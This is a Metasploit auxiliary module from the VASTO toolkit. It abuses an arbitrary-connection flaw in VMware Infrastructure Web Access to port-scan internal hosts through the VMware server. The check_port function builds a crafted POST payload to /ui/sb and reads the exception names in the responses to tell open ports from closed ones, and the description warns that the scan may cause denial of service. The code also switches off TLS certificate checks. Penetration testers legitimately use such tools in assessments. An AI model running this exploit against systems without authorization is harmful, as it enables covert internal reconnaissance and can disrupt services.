#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	# Scanner mixin should be near last
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	#Fixing invalid certificate complaints, if necessary
	OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE if OpenSSL::SSL::VERIFY_PEER.nil?

	def initialize
		super(
			'Name'        => 'VMware Web Access Relay Port Scanner',
			'Version'     => '1.0',
			'Description' => 'This module exploits a vulnerability in VMware Infrastructure Web Access that allows arbitrary HTTP/S connections to third-party hosts. As a result, it is possible to perform internal portscannig. Be aware that many connection attempts may cause Denial of Service! For more details regarding this flaw, please refer to the original advisory. 
			
			 Tested on VMware Infrastructure Web AccessVersion 2.0.0 Build 128374 (VMware ServerVersion 2.0.2 Build 203138 - Linux). 
.',
			'Author'      => ['drk1wi', 'Luca Carettoni'],
			'References'	=>
				[
					[ 'URL', 'http://www.ikkisoft.com/stuff/vmware_webaccess_portscan.txt' ],
					[ 'OSVDB', '' ], #to be filled
					[ 'BID', '' ], #to be filled
					[ 'CVE', '' ], #to be filled
				],
			'License'     =>  GPL_LICENSE
		)
		register_options([
			OptString.new('RPORTS', [true, "Ports to scan (e.g. 22-25,80)", "1-1024"]),
			OptAddress.new('BOUNCEHOST', [true, "Relay host"]),
			OptPort.new('BOUNCEPORT', [true, "Relay port", 8333]),
			OptBool.new('SSL', [ true, "Use SSL", true ]),
			OptInt.new('TIMEOUT', [ true, "Socket connect timeout (sec)", 5])
		])

		deregister_options('RHOST','RPORT')
	end

	#Check a specific IP and TCP port using the "VMware Infrastructure Web Access Arbitrary Connection Vulnerability"
	def check_port(ip, port)
		data=%q#[{i:"2",exec:"/action/login",args:["https://#+ip.to_s()+":"+port.to_s()+%q#","FOO","BAR"]}] #
		begin
		res = send_request_raw({
			'uri'          => '/ui/sb',
			'method'       => 'POST',
			'headers'      => 
			{'Content-Length' => data.length,},
			'data'         => "#{data}"
		}, datastore['TIMEOUT'])
	
		#for debug purpose only
		#if (res)
		  #print_status(" #{data} content: #{res.to_s()}")
  		#end
		
		if (res and res.body =~ /ServiceNotAvailableException/)
		      return "OPEN" #open port
		elsif (res and res.body =~ /ConnectException/)
		      return "CLOSED" #closed port
		else
		      return "OPEN/FILTERED" #uncertain state (e.g. timeout occurs)
		end
		end
	end

	#Scan a single IP. This is done in order to understand wheter the host is down or not reachable. 
	def check_ip(ip)
		  if(check_port(ip,0)=="CLOSED")
		    print_status("Host is up!")
		    return TRUE
		  end
	print_error("This host appears to be down or not reachable...")
	return FALSE
	end

	# Run the portscanning
	def run_host(ip)

		datastore['RHOST'] = datastore['BOUNCEHOST']
		datastore['RPORT'] = datastore['BOUNCEPORT']

		print_status("Scanning #{ip}...")
		if(check_ip(ip))
		  ports = Rex::Socket.portspec_crack(datastore['RPORTS'])
		  ports.each do |port|	
		     out = check_port(ip, port)
		     if(out!="CLOSED")#we don't want to smear the msfconsole
			  print_good("TCP Port #{port} is "+out)
		     end
		  end
		end
	end
end #game over
